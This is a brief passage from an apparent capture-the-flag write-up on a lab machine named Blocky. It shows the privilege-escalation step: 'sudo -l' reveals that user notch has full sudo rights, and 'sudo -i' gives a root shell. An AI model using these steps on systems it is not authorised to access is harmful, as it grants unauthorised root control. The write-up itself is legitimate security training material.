# 12 - PrivEsc


# sudo permissions
```bash
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

This looks like the default sudo permissions after installation.



```bash
notch@Blocky:~$ sudo -i
root@Blocky:~# id
uid=0(root) gid=0(root) groups=0(root)
```